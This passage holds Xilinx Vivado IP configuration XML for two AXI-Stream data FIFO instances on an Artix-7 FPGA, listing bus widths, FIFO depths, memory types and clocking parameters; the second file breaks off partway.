<spirit:design xmlns:xilinx="http://www.xilinx.com" xmlns:spirit="http://www.spiritconsortium.org/XMLSchema/SPIRIT/1685-2009" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <spirit:vendor>xilinx.com</spirit:vendor>
  <spirit:library>xci</spirit:library>
  <spirit:name>unknown</spirit:name>
  <spirit:version>1.0</spirit:version>
  <spirit:componentInstances>
    <spirit:componentInstance>
      <spirit:instanceName>axis_data_fifo_0</spirit:instanceName>
      <spirit:componentRef spirit:vendor="xilinx.com" spirit:library="ip" spirit:name="axis_data_fifo" spirit:version="2.0"/>
      <spirit:configurableElementValues>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.CLK_DOMAIN"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.FREQ_HZ">100000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.HAS_TKEEP">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.HAS_TLAST">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.HAS_TREADY">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.HAS_TSTRB">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.INSERT_VIP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.LAYERED_METADATA">undef</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.PHASE">0.000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.TDATA_NUM_BYTES">8</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.TDEST_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.TID_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.TUSER_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_CLKENIF.POLARITY">ACTIVE_LOW</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_CLKIF.ASSOCIATED_RESET"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_CLKIF.CLK_DOMAIN"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_CLKIF.FREQ_HZ">100000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_CLKIF.INSERT_VIP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_CLKIF.PHASE">0.000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.CLK_DOMAIN"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.FREQ_HZ">100000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.HAS_TKEEP">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.HAS_TLAST">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.HAS_TREADY">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.HAS_TSTRB">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.INSERT_VIP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.LAYERED_METADATA">undef</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.PHASE">0.000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.TDATA_NUM_BYTES">8</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.TDEST_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.TID_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.TUSER_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_CLKENIF.POLARITY">ACTIVE_LOW</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_CLKIF.ASSOCIATED_RESET"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_CLKIF.CLK_DOMAIN"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_CLKIF.FREQ_HZ">100000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_CLKIF.INSERT_VIP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_CLKIF.PHASE">0.000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_RSTIF.INSERT_VIP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_RSTIF.POLARITY">ACTIVE_LOW</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_ACLKEN_CONV_MODE">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_AXIS_SIGNAL_SET">0b00000000000000000000000000011011</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_AXIS_TDATA_WIDTH">64</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_AXIS_TDEST_WIDTH">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_AXIS_TID_WIDTH">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_AXIS_TUSER_WIDTH">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_ECC_MODE">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_FAMILY">artix7</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_FIFO_DEPTH">32</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_FIFO_MEMORY_TYPE">distributed</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_FIFO_MODE">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_IS_ACLK_ASYNC">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_PROG_EMPTY_THRESH">5</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_PROG_FULL_THRESH">11</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_SYNCHRONIZER_STAGE">3</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_USE_ADV_FEATURES">825765944</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.ACLKEN_CONV_MODE">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Component_Name">axis_data_fifo_0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.ENABLE_ECC">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.FIFO_DEPTH">32</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.FIFO_MEMORY_TYPE">distributed</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.FIFO_MODE">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_AEMPTY">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_AFULL">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_ECC_ERR_INJECT">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_PROG_EMPTY">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_PROG_FULL">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_RD_DATA_COUNT">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_TKEEP">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_TLAST">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_TREADY">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_TSTRB">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_WR_DATA_COUNT">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.IS_ACLK_ASYNC">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.PROG_EMPTY_THRESH">5</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.PROG_FULL_THRESH">11</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.SYNCHRONIZATION_STAGES">3</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.TDATA_NUM_BYTES">8</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.TDEST_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.TID_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.TUSER_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.ARCHITECTURE">artix7</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.BASE_BOARD_PART"/>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.BOARD_CONNECTIONS"/>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.DEVICE">xc7a50t</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.PACKAGE">csg325</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.PREFHDL">VERILOG</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.SILICON_REVISION"/>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.SIMULATOR_LANGUAGE">MIXED</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.SPEEDGRADE">-2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.STATIC_POWER"/>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.TEMPERATURE_GRADE"/>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.USE_RDI_CUSTOMIZATION">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.USE_RDI_GENERATION">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.IPCONTEXT">IP_Flow</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.IPREVISION">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.MANAGED">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.OUTPUTDIR">.</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.SELECTEDSIMMODEL"/>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.SHAREDDIR">.</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.SWVERSION">2019.2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.SYNTHESISFLOW">OUT_OF_CONTEXT</spirit:configurableElementValue>
      </spirit:configurableElementValues>
      <spirit:vendorExtensions>
        <xilinx:componentInstanceExtensions>
          <xilinx:configElementInfos>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.M_AXIS.HAS_TKEEP" xilinx:valueSource="auto"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.M_AXIS.HAS_TLAST" xilinx:valueSource="auto"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.M_AXIS.TDATA_NUM_BYTES" xilinx:valueSource="auto"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.S_AXIS.HAS_TKEEP" xilinx:valueSource="auto"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.S_AXIS.HAS_TLAST" xilinx:valueSource="auto"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.S_AXIS.TDATA_NUM_BYTES" xilinx:valueSource="auto"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.FIFO_DEPTH" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.FIFO_MEMORY_TYPE" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.FIFO_MODE" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.HAS_TKEEP" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.HAS_TLAST" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.IS_ACLK_ASYNC" xilinx:valueSource="user"/>
            <xilinx:configElementInfo xilinx:referenceId="PARAM_VALUE.TDATA_NUM_BYTES" xilinx:valueSource="user"/>
          </xilinx:configElementInfos>
        </xilinx:componentInstanceExtensions>
      </spirit:vendorExtensions>
    </spirit:componentInstance>
  </spirit:componentInstances>
</spirit:design>

```

`ip/axis_data_fifo_1.xci`:

```xci
<?xml version="1.0" encoding="UTF-8"?>
<spirit:design xmlns:xilinx="http://www.xilinx.com" xmlns:spirit="http://www.spiritconsortium.org/XMLSchema/SPIRIT/1685-2009" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <spirit:vendor>xilinx.com</spirit:vendor>
  <spirit:library>xci</spirit:library>
  <spirit:name>unknown</spirit:name>
  <spirit:version>1.0</spirit:version>
  <spirit:componentInstances>
    <spirit:componentInstance>
      <spirit:instanceName>axis_data_fifo_1</spirit:instanceName>
      <spirit:componentRef spirit:vendor="xilinx.com" spirit:library="ip" spirit:name="axis_data_fifo" spirit:version="2.0"/>
      <spirit:configurableElementValues>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.CLK_DOMAIN"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.FREQ_HZ">100000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.HAS_TKEEP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.HAS_TLAST">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.HAS_TREADY">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.HAS_TSTRB">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.INSERT_VIP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.LAYERED_METADATA">undef</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.PHASE">0.000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.TDATA_NUM_BYTES">4</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.TDEST_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.TID_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_AXIS.TUSER_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_CLKENIF.POLARITY">ACTIVE_LOW</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_CLKIF.ASSOCIATED_RESET"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_CLKIF.CLK_DOMAIN"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_CLKIF.FREQ_HZ">100000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_CLKIF.INSERT_VIP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.M_CLKIF.PHASE">0.000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.CLK_DOMAIN"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.FREQ_HZ">100000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.HAS_TKEEP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.HAS_TLAST">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.HAS_TREADY">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.HAS_TSTRB">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.INSERT_VIP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.LAYERED_METADATA">undef</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.PHASE">0.000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.TDATA_NUM_BYTES">4</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.TDEST_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.TID_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_AXIS.TUSER_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_CLKENIF.POLARITY">ACTIVE_LOW</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_CLKIF.ASSOCIATED_RESET"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_CLKIF.CLK_DOMAIN"/>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_CLKIF.FREQ_HZ">100000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_CLKIF.INSERT_VIP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_CLKIF.PHASE">0.000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_RSTIF.INSERT_VIP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="BUSIFPARAM_VALUE.S_RSTIF.POLARITY">ACTIVE_LOW</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_ACLKEN_CONV_MODE">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_AXIS_SIGNAL_SET">0b00000000000000000000000000010011</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_AXIS_TDATA_WIDTH">32</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_AXIS_TDEST_WIDTH">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_AXIS_TID_WIDTH">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_AXIS_TUSER_WIDTH">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_ECC_MODE">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_FAMILY">artix7</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_FIFO_DEPTH">16</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_FIFO_MEMORY_TYPE">auto</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_FIFO_MODE">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_IS_ACLK_ASYNC">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_PROG_EMPTY_THRESH">5</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_PROG_FULL_THRESH">11</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_SYNCHRONIZER_STAGE">3</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.C_USE_ADV_FEATURES">825765944</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.ACLKEN_CONV_MODE">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Component_Name">axis_data_fifo_1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.ENABLE_ECC">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.FIFO_DEPTH">16</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.FIFO_MEMORY_TYPE">auto</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.FIFO_MODE">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_AEMPTY">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_AFULL">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_ECC_ERR_INJECT">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_PROG_EMPTY">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_PROG_FULL">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_RD_DATA_COUNT">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_TKEEP">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_TLAST">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_TREADY">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_TSTRB">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.HAS_WR_DATA_COUNT">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.IS_ACLK_ASYNC">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.PROG_EMPTY_THRESH">5</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.PROG_FULL_THRESH">11</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.SYNCHRONIZATION_STAGES">3</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.TDATA_NUM_BYTES">4</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.TDEST_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.TID_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.TUSER_WIDTH">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.ARCHITECTURE">artix7</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.BASE_BOARD_PART"/>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.BOARD_CONNECTIONS"/>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.DEVICE">xc7a50t</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.PACKAGE">csg325</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.PREFHDL">VERILOG</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.SILICON_REVISION"/>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.SIMULATOR_LANGUAGE">MIXED</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.SPEEDGRADE">-2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.STATIC_POWER"/>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.TEMPERATURE_GRADE"/>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.USE_RDI_CUSTOMIZATION">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PROJECT_PARAM.USE_RDI_GENERATION">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.IPCONTEXT">IP_Flow</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.IPREVISION">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.MANAGED">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.OUTPUTDIR">.</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.SELECTEDSIMMODEL"/>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.SHAREDDIR">.</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.SWVERSION">2019.2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="RUNTIME_PARAM.SYNTHESISFLOW">OUT_OF_CONTEXT</spirit:configurableElementValue>
      </spirit:configurableElementValues>
      <spirit:vendorExtensions>
        <xilinx:componentInstanceExtensions>
          <xilinx:configElementInfos>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.M_AXIS.HAS_TLAST" xilinx:valueSource="auto"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.M_AXIS.TDATA_NUM_BYTES" xilinx:valueSource="auto"/>
            <xilinx:configElementInfo xilinx:referenceId="BUSIFPARAM_VALUE.S_AXIS.HAS_TLAST" xilinx:valueSource="auto"/>
